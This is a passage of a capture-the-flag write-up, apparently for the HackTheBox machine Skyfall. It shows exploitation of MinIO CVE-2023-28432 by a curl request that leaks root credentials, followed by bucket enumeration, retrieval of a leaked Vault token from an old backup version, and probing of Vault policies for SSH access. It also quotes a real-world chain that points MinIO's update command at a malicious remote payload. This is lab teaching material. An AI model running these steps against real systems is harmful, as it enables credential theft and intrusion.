+<p>Interestingly, visiting <code class="language-plaintext highlighter-rouge">/metrics%0a</code> also works. It’s not super clear to me why Flask (or something else on the server) is decoding <code class="language-plaintext highlighter-rouge">%0a</code> but not others like <code class="language-plaintext highlighter-rouge">%0C</code>, but it does:</p>
+<picture>
+<source srcset="/img/image-20240824143138209.webp" type="image/webp"/>
+<img alt="image-20240824143138209" class="include_image" loading="lazy" src="/img/image-20240824143138209.png"/>
+</picture>
+<h3 id="find-vault">Find Vault</h3>
+<h4 id="cve-analysis">CVE Analysis</h4>
+<p>Searching for vulnerabilities in this version of MinIO, the first result is from MinIO talking about CVE-2023-28432 and CVE-2023-28434:</p>
+<picture>
+<source srcset="/img/image-20240824144834681.webp" type="image/webp"/>
+<img alt="image-20240824144834681" class="include_image" loading="lazy" src="/img/image-20240824144834681.png"/>
+</picture>
+<p>The <a href="https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q?ref=blog.min.io">advisory for CVE-2023-28432</a> say it is:</p>
+<blockquote>
+<p>In a cluster deployment, MinIO returns all environment variables, including <code class="language-plaintext highlighter-rouge">MINIO_SECRET_KEY</code>
+and <code class="language-plaintext highlighter-rouge">MINIO_ROOT_PASSWORD</code>, resulting in information disclosure.</p>
+</blockquote>
+<p>That seems simple enough. Dump all the environment variables. And it say there’s are no work arounds.</p>
+<p>The <a href="https://github.com/minio/minio/security/advisories/GHSA-2pxw-r47w-4p8c?ref=blog.min.io">advisory for CVE-2023-28434</a> say it is:</p>
+<blockquote>
+<p>An attacker can use crafted requests to bypass metadata bucket name checking and put an object into any bucket while processing <code class="language-plaintext highlighter-rouge">PostPolicyBucket</code>. To carry out this attack, the attacker requires credentials with <code class="language-plaintext highlighter-rouge">arn:aws:s3:::*</code> permission, as well as enabled Console API access.</p>
+</blockquote>
+<p>This one can be prevented by setting <code class="language-plaintext highlighter-rouge">MINIO_BROWSER=off</code>.</p>
+<p>The MinIO post links to a post from Security Joes, <a href="https://www.securityjoes.com/post/new-attack-vector-in-the-cloud-attackers-caught-exploiting-object-storage-services?ref=blog.min.io">New Attack Vector In The Cloud: Attackers caught exploiting Object Storage Services</a>, that goes into great detail about real world attacks they were seeing.</p>
+<blockquote>
+<p>All the steps required to achieve code execution in a vulnerable MinIO instance are described below:</p>
+<p><strong>1.</strong> POST request to endpoint <strong>/minio/bootstrap/v1/verify</strong> to expose the credentials of the admin account.</p>
+<p><strong>2.</strong> Attacker configures a MinIO client to interact with the vulnerable instance using the credentials gotten in Step 1. For this, the following command lines are required:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">mc alias set [ALIAS] [URL_TARGET_MINIO] [ACCESS_KEY] [SECRET_KEY]
+mc alias list
+</span></code></pre></div> </div>
+<p><strong>3.</strong> Attackers trigger the update process on the compromised MinIO instance, pointing to a malicious payload hosted on a remote server. For this, the following command is executed.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">mc admin update [ALIAS] [MIRROR_URL] --yes
+</span></code></pre></div> </div>
+<p><strong>4.</strong> “Evil” MinIO is installed, now containing a global backdoor that allows the attacker to execute commands on the host.</p>
+</blockquote>
+<p>Step 1 is CVE-2023-28432.</p>
+<h4 id="cve-2023-28432">CVE-2023-28432</h4>
+<p>There’s a <a href="https://github.com/acheiii/CVE-2023-28432">Python POC exploit</a> (published over a year before Skyfall’s release), but I don’t need to run it. All it does is make a POST request to <code class="language-plaintext highlighter-rouge">/minio/bootstrap/v1/verify</code> on the instance:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-X</span> POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify
+<span class="go">{"MinioEndpoints":[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false}],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-X</span> POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify <span class="nt">-s</span> | jq <span class="nb">.</span>
+<span class="go">{
+  "MinioEndpoints": [
+    {
+      "Legacy": false,
+      "SetCount": 1,
+      "DrivesPerSet": 4,
+      "Endpoints": [
+        {
+          "Scheme": "http",
+          "Opaque": "",
+          "User": null,
+          "Host": "minio-node1:9000",
+          "Path": "/data1",
+          "RawPath": "",
+          "OmitHost": false,
+          "ForceQuery": false,
+          "RawQuery": "",
+          "Fragment": "",
+          "RawFragment": "",
+          "IsLocal": false
+        },
+        {
+          "Scheme": "http",
+          "Opaque": "",
+          "User": null,
+          "Host": "minio-node2:9000",
+          "Path": "/data1",
+          "RawPath": "",
+          "OmitHost": false,
+          "ForceQuery": false,
+          "RawQuery": "",
+          "Fragment": "",
+          "RawFragment": "",
+          "IsLocal": true
+        },
+        {
+          "Scheme": "http",
+          "Opaque": "",
+          "User": null,
+          "Host": "minio-node1:9000",
+          "Path": "/data2",
+          "RawPath": "",
+          "OmitHost": false,
+          "ForceQuery": false,
+          "RawQuery": "",
+          "Fragment": "",
+          "RawFragment": "",
+          "IsLocal": false
+        },
+        {
+          "Scheme": "http",
+          "Opaque": "",
+          "User": null,
+          "Host": "minio-node2:9000",
+          "Path": "/data2",
+          "RawPath": "",
+          "OmitHost": false,
+          "ForceQuery": false,
+          "RawQuery": "",
+          "Fragment": "",
+          "RawFragment": "",
+          "IsLocal": true
+        }
+      ],
+      "CmdLine": "http://minio-node{1...2}/data{1...2}",
+      "Platform": "OS: linux | Arch: amd64"
+    }
+  ],
+  "MinioEnv": {
+    "MINIO_ACCESS_KEY_FILE": "access_key",
+    "MINIO_BROWSER": "off",
+    "MINIO_CONFIG_ENV_FILE": "config.env",
+    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
+    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
+    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
+    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
+    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
+    "MINIO_ROOT_USER_FILE": "access_key",
+    "MINIO_SECRET_KEY_FILE": "secret_key",
+    "MINIO_UPDATE": "off",
+    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
+  }
+}
+</span></code></pre></div></div>
+<p>The important part is the root user is 5GrE1B2YGGyZzNHZaIww and the root password is “GkpjkmiVmpFuL2d3oRx0”. I’ll also note that <code class="language-plaintext highlighter-rouge">MINIO_BROWSER=off</code>, which blocks the next exploit.</p>
+<h4 id="setup-minio-client">Setup MinIO Client</h4>
+<p>There’s a MinIO client, <code class="language-plaintext highlighter-rouge">mc</code>, to interact with a given MinIO instance. I’ll download it using the instructions <a href="https://min.io/docs/minio/linux/reference/minio-mc.html">in the MinIO docs</a>. Next I create an alias with the keys necessary to connect:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc <span class="nb">alias set </span>skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0
+<span class="go">Added `skyfall` successfully.
+</span></code></pre></div></div>
+<p>Next it says to test the connection with this command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc admin info skyfall
+<span class="go">mc: &lt;ERROR&gt;  Unable to display service info, server is too old
+</span></code></pre></div></div>
+<p>I am able to run <code class="language-plaintext highlighter-rouge">ls</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc <span class="nb">ls </span>skyfall
+<span class="go">[2023-11-07 23:59:15 EST]     0B askyy/
+[2023-11-07 23:58:56 EST]     0B btanner/
+[2023-11-07 23:58:33 EST]     0B emoneypenny/
+[2023-11-07 23:58:22 EST]     0B gmallory/
+[2023-11-07 19:08:01 EST]     0B guest/
+[2023-11-07 23:59:05 EST]     0B jbond/
+[2023-11-07 23:58:10 EST]     0B omansfield/
+[2023-11-07 23:58:45 EST]     0B rsilva/
+</span></code></pre></div></div>
+<h4 id="minio-enumeration">MinIO Enumeration</h4>
+<p><code class="language-plaintext highlighter-rouge">ls -r</code> will recursively show all the files in the cluster:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc <span class="nb">ls</span> <span class="nt">-r</span> skyfall
+<span class="go">[2023-11-08 00:35:28 EST]  48KiB STANDARD askyy/Welcome.pdf
+[2023-11-09 16:37:25 EST] 2.5KiB STANDARD askyy/home_backup.tar.gz
+[2023-11-08 00:35:36 EST]  48KiB STANDARD btanner/Welcome.pdf
+[2023-11-08 00:35:56 EST]  48KiB STANDARD emoneypenny/Welcome.pdf
+[2023-11-08 00:36:02 EST]  48KiB STANDARD gmallory/Welcome.pdf
+[2023-11-07 19:08:05 EST]  48KiB STANDARD guest/Welcome.pdf
+[2024-08-23 17:27:13 EDT] 4.4KiB STANDARD guest/htb.png
+[2023-11-08 00:35:45 EST]  48KiB STANDARD jbond/Welcome.pdf
+[2023-11-08 00:36:09 EST]  48KiB STANDARD omansfield/Welcome.pdf
+[2023-11-08 00:35:51 EST]  48KiB STANDARD rsilva/Welcome.pdf
+</span></code></pre></div></div>
+<p>Besides the <code class="language-plaintext highlighter-rouge">Welcome.pdf</code> files that are all the same size, there’s two files (one of which I uploaded, <code class="language-plaintext highlighter-rouge">htb.png</code>). askyy is the lead developer. I’ll grab their <code class="language-plaintext highlighter-rouge">home_backup.tar.gz</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc <span class="nb">cp </span>skyfall/askyy/home_backup.tar.gz <span class="nb">.</span>
+<span class="go">...fall.htb/askyy/home_backup.tar.gz: 2.48 KiB / 2.48 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 6.80 KiB/s 0s
+</span></code></pre></div></div>
+<p>I’ll extract it and take a look:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">tar </span>xf home_backup.tar.gz <span class="nt">-C</span> home_backup/
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>find home_backup/ <span class="nt">-type</span> f
+<span class="go">home_backup/.ssh/authorized_keys
+home_backup/.cache/motd.legal-displayed
+home_backup/.bash_logout
+home_backup/.profile
+home_backup/.bashrc
+home_backup/.sudo_as_admin_successful
+home_backup/.bash_history
+</span></code></pre></div></div>
+<p>There’s nothing interesting there.</p>
+<p>Back to MinIO, I can look for previous versions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc <span class="nb">ls</span> <span class="nt">-r</span> <span class="nt">--versions</span> skyfall 
+<span class="go">[2023-11-07 23:59:15 EST]     0B askyy/
+[2023-11-08 00:35:28 EST]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT askyy/Welcome.pdf
+[2023-11-09 16:37:25 EST] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT askyy/home_backup.tar.gz
+[2023-11-09 16:37:09 EST] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT askyy/home_backup.tar.gz
+[2023-11-09 16:36:30 EST] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT askyy/home_backup.tar.gz
+[2023-11-07 23:58:56 EST]     0B btanner/
+[2023-11-08 00:35:36 EST]  48KiB STANDARD null v1 PUT btanner/Welcome.pdf
+[2023-11-07 23:58:33 EST]     0B emoneypenny/
+[2023-11-08 00:35:56 EST]  48KiB STANDARD null v1 PUT emoneypenny/Welcome.pdf
+[2023-11-07 23:58:22 EST]     0B gmallory/
+[2023-11-08 00:36:02 EST]  48KiB STANDARD null v1 PUT gmallory/Welcome.pdf
+[2023-11-07 19:08:01 EST]     0B guest/
+[2023-11-07 19:08:05 EST]  48KiB STANDARD null v1 PUT guest/Welcome.pdf
+[2024-08-23 17:27:13 EDT] 4.4KiB STANDARD null v1 PUT guest/htb.png
+[2023-11-07 23:59:05 EST]     0B jbond/
+[2023-11-08 00:35:45 EST]  48KiB STANDARD null v1 PUT jbond/Welcome.pdf
+[2023-11-07 23:58:10 EST]     0B omansfield/
+[2023-11-08 00:36:09 EST]  48KiB STANDARD null v1 PUT omansfield/Welcome.pdf
+[2023-11-07 23:58:45 EST]     0B rsilva/
+[2023-11-08 00:35:51 EST]  48KiB STANDARD null v1 PUT rsilva/Welcome.pdf
+</span></code></pre></div></div>
+<p>The home backup files all are different size. I’ve already got v3. I’ll look at v2 and v1:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc <span class="nb">cp</span> <span class="nt">--version-id</span> 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz ./home_backup_v2.tar.gz
+<span class="go">...fall.htb/askyy/home_backup.tar.gz: 2.64 KiB / 2.64 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 7.27 KiB/s 0s
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>mc <span class="nb">cp</span> <span class="nt">--version-id</span> 3c498578-8dfe-43b7-b679-32a3fe42018f skyfall/askyy/home_backup.tar.gz ./home_backup_v1.tar.gz
+<span class="go">...fall.htb/askyy/home_backup.tar.gz: 1.18 MiB / 1.18 MiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 1.21 MiB/s 0s
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">mkdir </span>home_backup_v2
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">mkdir </span>home_backup_v1
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">tar</span> <span class="nt">-xf</span> home_backup_v2.tar.gz <span class="nt">-C</span> home_backup_v2
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">tar</span> <span class="nt">-xf</span> home_backup_v1.tar.gz <span class="nt">-C</span> home_backup_v1
+</code></pre></div></div>
+<p>Version 1 has a big <code class="language-plaintext highlighter-rouge">.bash_history</code> file, and a <code class="language-plaintext highlighter-rouge">terraform-generator</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> home_backup_v1
+<span class="go">total 48
+drwxrwx--- 1 root vboxsf  4096 Nov  9  2023 .
+drwxrwx--- 1 root vboxsf  4096 Aug 24 16:31 ..    
+-rwxrwx--- 1 root vboxsf 10296 Nov  8  2023 .bash_history
+-rwxrwx--- 1 root vboxsf   220 Jan  6  2022 .bash_logout
+-rwxrwx--- 1 root vboxsf  3771 Jan  6  2022 .bashrc
+drwxrwx--- 1 root vboxsf  4096 Oct  9  2023 .cache
+-rwxrwx--- 1 root vboxsf   807 Jan  6  2022 .profile
+drwxrwx--- 1 root vboxsf  4096 Nov  9  2023 .ssh
+-rwxrwx--- 1 root vboxsf     0 Oct  9  2023 .sudo_as_admin_successful
+drwxrwx--- 1 root vboxsf  4096 Nov  9  2023 terraform-generator
+-rwxrwx--- 1 root vboxsf     1 Nov  9  2023 .viminfo
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> home_backup
+<span class="go">total 32
+drwxrwx--- 1 root vboxsf 4096 Aug 24 16:15 .
+drwxrwx--- 1 root vboxsf 4096 Aug 24 16:31 ..
+-rwxrwx--- 1 root vboxsf    1 Nov  9  2023 .bash_history
+-rwxrwx--- 1 root vboxsf  220 Jan  6  2022 .bash_logout
+-rwxrwx--- 1 root vboxsf 3771 Nov  9  2023 .bashrc
+drwxrwx--- 1 root vboxsf 4096 Oct  9  2023 .cache
+-rwxrwx--- 1 root vboxsf  807 Jan  6  2022 .profile
+drwxrwx--- 1 root vboxsf 4096 Nov  9  2023 .ssh
+-rwxrwx--- 1 root vboxsf    0 Oct  9  2023 .sudo_as_admin_successful
+</span></code></pre></div></div>
+<p>There’s nothing interesting in either of these.</p>
+<p>v2 has the same files, and the only difference is the slightly larger <code class="language-plaintext highlighter-rouge">.bashrc</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> home_backup_v2
+<span class="go">total 32
+drwxrwx--- 1 root vboxsf 4096 Nov  9  2023 .
+drwxrwx--- 1 root vboxsf 4096 Aug 24 16:38 ..
+-rwxrwx--- 1 root vboxsf    1 Nov  9  2023 .bash_history
+-rwxrwx--- 1 root vboxsf  220 Jan  6  2022 .bash_logout
+-rwxrwx--- 1 root vboxsf 3953 Nov  9  2023 .bashrc
+drwxrwx--- 1 root vboxsf 4096 Oct  9  2023 .cache
+-rwxrwx--- 1 root vboxsf  807 Jan  6  2022 .profile
+drwxrwx--- 1 root vboxsf 4096 Nov  9  2023 .ssh
+-rwxrwx--- 1 root vboxsf    0 Oct  9  2023 .sudo_as_admin_successful
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> home_backup
+<span class="go">total 32
+drwxrwx--- 1 root vboxsf 4096 Aug 24 16:15 .
+drwxrwx--- 1 root vboxsf 4096 Aug 24 16:38 ..
+-rwxrwx--- 1 root vboxsf    1 Nov  9  2023 .bash_history
+-rwxrwx--- 1 root vboxsf  220 Jan  6  2022 .bash_logout
+-rwxrwx--- 1 root vboxsf 3771 Nov  9  2023 .bashrc
+drwxrwx--- 1 root vboxsf 4096 Oct  9  2023 .cache
+-rwxrwx--- 1 root vboxsf  807 Jan  6  2022 .profile
+drwxrwx--- 1 root vboxsf 4096 Nov  9  2023 .ssh
+-rwxrwx--- 1 root vboxsf    0 Oct  9  2023 .sudo_as_admin_successful
+</span></code></pre></div></div>
+<p>The difference is interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>diff home_backup_v2/.bashrc home_backup/.bashrc
+<span class="go">43,45d42
+</span><span class="diff-removed">&lt; export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
+&lt; export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+&lt; 
+</span></code></pre></div></div>
+<p>Another domain for my <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb prd23-vault-internal.skyfall.htb
+</code></pre></div></div>
+<h3 id="ssh">SSH</h3>
+<h4 id="vault-setup">Vault Setup</h4>
+<p>The “vault” here is <a href="https://www.vaultproject.io/">HashiCorp Vault</a>, which I actually ran into back in 2020 in <a href="/2020/01/04/htb-craft.html#enumerate-vault">Craft</a>. In Craft, the <code class="language-plaintext highlighter-rouge">vault</code> binary was installed on the box. I’ll install it on my box using the instructions <a href="https://developer.hashicorp.com/vault/tutorials/getting-started/getting-started-install">in the HashiCorp docs</a>.</p>
+<p>Just like in Craft, I can start by looking up information about the logged in user. I’ll need to set three environment variables for the client to work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">export </span><span class="nv">VAULT_ADDR</span><span class="o">=</span><span class="s2">"http://prd23-vault-internal.skyfall.htb"</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">export </span><span class="nv">VAULT_API_ADDR</span><span class="o">=</span><span class="s2">"http://prd23-vault-internal.skyfall.htb"</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">export </span><span class="nv">VAULT_TOKEN</span><span class="o">=</span><span class="s2">"hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"</span>
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>vault token lookup
+<span class="go">Key                  Value
+---                  -----
+accessor             rByv1coOBC9ITZpzqbDtTUm8
+creation_time        1699563963
+creation_ttl         768h
+display_name         token-askyy
+entity_id            n/a
+expire_time          2073-10-27T21:06:03.043964076Z
+explicit_max_ttl     0s
+id                   hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
+issue_time           2023-11-09T21:06:03.445155372Z
+last_renewal         2023-11-20T16:43:24.043964166Z
+last_renewal_time    1700498604
+meta                 &lt;nil&gt;
+num_uses             0
+orphan               true
+path                 auth/token/create
+policies             [default developers]
+renewable            true
+ttl                  431063h45m10s
+type                 service
+</span></code></pre></div></div>
+<p>In Craft I next did a list of secrets, but here I don’t have that access:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault secrets list
+<span class="go">Error listing secrets engines: Error making API request.
+
+URL: GET http://prd23-vault-internal.skyfall.htb/v1/sys/mounts
+Code: 403. Errors:
+
+* 1 error occurred:
+        * permission denied
+</span></code></pre></div></div>
+<h4 id="identify-ssh-paths">Identify SSH Paths</h4>
+<p>For the next step, I need to find that this token has access to a role that grants SSH access. There isn’t an obvious solid path to get there, but I know of at least three ways to make this leap:</p>
+<pre><code class="language-mermaid">flowchart TD;
+    subgraph identifier[" "]
+      direction LR
+      start1[ ] ---&gt;|intended| stop1[ ]
+      style start1 height:0px;
+      style stop1 height:0px;
+      start2[ ] ---&gt;|unintended| stop2[ ]
+      style start2 height:0px;
+      style stop2 height:0px;
+    end
+    A[Vault Token]--&gt;B(&lt;a href='#guess-at-ssh'&gt;Guess at SSH&lt;/a&gt;);
+    B--&gt;C[SSH as askyy];
+    A--&gt;D(&lt;a href='#developer-policy'&gt;Policy API&lt;/a&gt;);
+    D--&gt;C;
+    A--&gt;E(&lt;a href='#sysinternaluiresultant-acl'&gt;Dump Full Permissions&lt;/a&gt;);
+    E--&gt;C;
+
+linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
+linkStyle 1,2,3,6,7 stroke-width:2px,stroke:#4B9CD3,fill:none;
+style identifier fill:#1d1d1d,color:#FFFFFFFF;
+</code></pre>
+<h4 id="guess-at-ssh">Guess At SSH</h4>
+<p>One of the main capabilities of Vault is to manage secrets for SSH access, and it would certainly be useful to me to gain access to that. I’ll notice when I try to access most things, it returns a 403 error like the one above. When I try to list SSH, it returns something different:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault list ssh
+<span class="go">No value found at ssh
+</span></code></pre></div></div>
+<p>Something is different about this token’s access to <code class="language-plaintext highlighter-rouge">ssh</code>. The <a href="https://developer.hashicorp.com/vault/api-docs/secret/ssh#list-roles">docs for SSH</a> show one thing to do is list roles, and that works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault list ssh/roles
+<span class="go">Keys
+----
+admin_otp_key_role
+dev_otp_key_role
+</span></code></pre></div></div>
+<h4 id="developer-policy">developer Policy</h4>
+<p>Initially I’ll attempt to look into the policies attached to my current token, but the client says I don’t have access:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault token capabilities policies
+<span class="go">deny
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault token capabilities policies/list
+<span class="go">deny
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault token capabilities policies/read
+<span class="go">deny
+</span></code></pre></div></div>
+<p>If I try to read these policies directly, it fails as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault policy list
+<span class="go">Error listing policies: Error making API request.
+
+URL: GET http://prd23-vault-internal.skyfall.htb/v1/sys/policies/acl?list=true
+Code: 403. Errors:
+
+* 1 error occurred:
+        * permission denied
+
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault policy <span class="nb">read </span>default
+<span class="go">Error reading policy named default: Error making API request.
+
+URL: GET http://prd23-vault-internal.skyfall.htb/v1/sys/policies/acl/default
+Code: 403. Errors:
+
+* 1 error occurred:
+        * permission denied
+
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>vault policy <span class="nb">read </span>developer
+<span class="go">Error reading policy named developer: Error making API request.
+
+URL: GET http://prd23-vault-internal.skyfall.htb/v1/sys/policies/acl/developer
+Code: 403. Errors:
+
+* 1 error occurred:
+        * permission denied
+</span></code></pre></div></div>
+<p>It’s trying to access <code class="language-plaintext highlighter-rouge">/v1/sys/policies/acl/developer</code> and failing. There’s <a href="https://developer.hashicorp.com/vault/api-docs/system/policy">another endpoint</a> in the docs which isn’t used (as far as I can tell) by the CLI, <code class="language-plaintext highlighter-rouge">/v1/sys/policy/[name]</code>. This one that works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-XGET</span> <span class="s2">"http://prd23-vault-internal.skyfall.htb/v1/sys/policy/developers"</span> <span class="nt">-H</span> <span class="s1">'X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE'</span> | jq <span class="nb">.</span>
+<span class="go">{
+  "rules": "path \"sys/policy/developers\" {\n  capabilities = [  \"read\" ]\n}\n\npath \"ssh/*\" {\n  capabilities = [ \"list\" ]\n}\n\npath \"ssh/creds/dev_otp_key_role\" {\n  capabilities = [\"create\", \"read\", \"update\"]\n}\n",
+  "name": "developers",
+  "request_id": "d1ef5bf4-fde7-6dd9-eac4-675170bb4900",
+  "lease_id": "",
+  "renewable": false,
+  "lease_duration": 0,
+  "data": {
+    "name": "developers",
+    "rules": "path \"sys/policy/developers\" {\n  capabilities = [  \"read\" ]\n}\n\npath \"ssh/*\" {\n  capabilities = [ \"list\" ]\n}\n\npath \"ssh/creds/dev_otp_key_role\" {\n  capabilities = [\"create\", \"read\", \"update\"]\n}\n"
+  },
+  "wrap_info": null,
+  "warnings": null,
+  "auth": null
+}
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">rules</code> is the most interesting part here:</p>
